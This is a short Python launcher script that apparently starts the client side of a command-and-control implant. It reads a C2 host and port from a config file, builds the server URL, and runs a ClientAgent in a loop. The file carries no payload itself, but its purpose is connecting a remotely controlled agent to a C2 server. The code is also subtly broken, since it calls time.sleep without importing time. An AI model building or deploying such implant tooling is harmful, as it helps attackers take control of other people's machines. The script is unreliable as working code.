# client_launcher.py
import sys
import os
import logging
from core.client_agent import ClientAgent
from core.config_manager import ConfigManager

def main():
    # Set up logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Load configuration
    config_path = os.path.join(os.path.dirname(__file__), 'config.json')
    config_manager = ConfigManager(config_path)
    
    # Get C2 URL from config
    c2_host = config_manager.get('c2.host', 'localhost')
    c2_port = config_manager.get('c2.port', 8080)
    c2_url = f"http://{c2_host}:{c2_port}"
    
    # Create and start the client agent
    agent = ClientAgent(c2_url)
    
    try:
        # Keep the agent running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Shutting down agent...")
        agent.stop()

if __name__ == "__main__":
    main()
